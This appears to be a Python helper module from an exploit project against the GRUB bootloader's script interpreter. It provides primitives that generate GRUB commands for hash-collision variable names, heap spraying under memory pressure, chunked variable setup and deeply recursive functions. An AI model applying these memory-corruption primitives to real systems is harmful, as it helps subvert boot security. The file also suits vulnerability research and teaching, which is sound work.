from consts import HASHSZ, HASHVAL_SPRAY


def pad(contents, size):
    pre = b'\x00'*(size - len(contents))
    return bytes(contents + pre)


def hashval(value):
    i = 0
    for c in value:
        if isinstance(c, int):
            i += 5 * c
        else:
            i += 5 * ord(c)
    return i % HASHSZ


def collide_hash(name, target_hashval):
    """
    generate a string with a specific hashvalue.
    """
    for i in range(0, 1024):
        newname = f'{name}_{i:04}'
        if hashval(newname) == target_hashval:
            return newname
    raise Exception('Could not collide hashval????')


def grub_print(msg):
    res = []
    for line in msg.split('\n'):
        res.append(f'echo {msg}')
    return res


def command(cmd):
    return [cmd]


def find_root(path, var):
    return [f'search.file {path} {var}']


class Variable:
    def __init__(self, name, target=None):
        self._name = name if target is None else collide_hash(name, target)

    def __str__(self):
        return f'{self._name}'

    def set(self, value):
        if isinstance(value, bytes):
            return [bytes(f'set {self._name}=', encoding='ascii')+value]
        return [f'set {self._name}={value}']

    def unset(self):
        return [f'unset {self._name}']


def force_regions_to_exist(name='HEAP', expand=8, hashval=HASHVAL_SPRAY):
    """
    Do large allocations, trying to get the region below the stack to exist.
    This puts us in a state of memory pressure, where we need to be careful
    as any large allocations will end up in the region we want to control.
    """
    res = []

    var = Variable(name, hashval)

    res = var.set('${template}${template}'*2)
    for i in range(8):
        val = f'${{{str(var)}}}' * expand
        res += var.set(val)
    res += var.unset()

    return res


# Stolen functions from stackoverflow
def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


class bidict(dict):
    def __init__(self, *args, **kwargs):
        super(bidict, self).__init__(*args, **kwargs)
        self.inverse = {}
        for key, value in self.items():
            self.inverse.setdefault(value, []).append(key)

    def __setitem__(self, key, value):
        if key in self:
            self.inverse[self[key]].remove(key)
        super(bidict, self).__setitem__(key, value)
        self.inverse.setdefault(value, []).append(key)

    def __delitem__(self, key):
        self.inverse.setdefault(self[key], []).remove(key)
        if self[key] in self.inverse and not self.inverse[self[key]]:
            del self.inverse[self[key]]
        super(bidict, self).__delitem__(key)


class VarSplit:
    CHUNK_SIZE = 1024

    def __init__(self, body):
        lchunks = [chunk for chunk in chunks(body, self.CHUNK_SIZE)]

        counts = {}

        for chunk in lchunks:
            if chunk in counts:
                counts[chunk] += 1
            else:
                counts[chunk] = 1

        self._dedup_chunks = bidict({
            f'p_{idx}': chunk for idx, chunk in enumerate(set(lchunks))
        })

        self._vars = ''
        for chunk in lchunks:
            a = self._dedup_chunks.inverse[chunk][0]
            self._vars += f'${{{a}}}'

    def setup(self):
        res = []
        for key, value in self._dedup_chunks.items():
            res.append(f'set {key}={value}')
        return res

    def define(self, name):
        return command(f'set {name}={self._vars}')

    def clean(self, count):
        res = []
        for chunk in self._dedup_chunks:
            res.append(f'unset {chunk}')
        return res


class Function:
    def __init__(self, name):
        self._name = name

    def call(self, args=[]):
        return [' '.join([self._name] + args)]

    def define(self, body):
        body_str = '    ' + '\n    '.join(body)
        return [f'function {self._name} {{\n{body_str}\n}}']


class RecursiveFuncs:
    """
    Define recursive functions.
    """

    def __init__(self, name, count=32):
        self._count = count
        self._name = name
        self._funcs = [
            Function(f'{name}_{i:04}') for i in range(self._count + 1)
        ]

    def setup(self):
        res = []
        for i in range(1, self._count + 1):
            res += self._funcs[i].define(
                self._funcs[i - 1].call(['$1'])
            )
        return res

    def define(self, func):
        return self._funcs[0].define(func)

    def call(self, depth, args):
        if isinstance(depth, int):
            return self._funcs[depth].call(args)
        else:
            arg = ' '.join(args)
            return [f'{self._name}_${{{depth}}} {arg}']


def while_loop(condition, body):
    body_str = '    ' + '\n    '.join(body)
    return [f'while [ { condition } ] ; do \n{ body_str }\ndone']
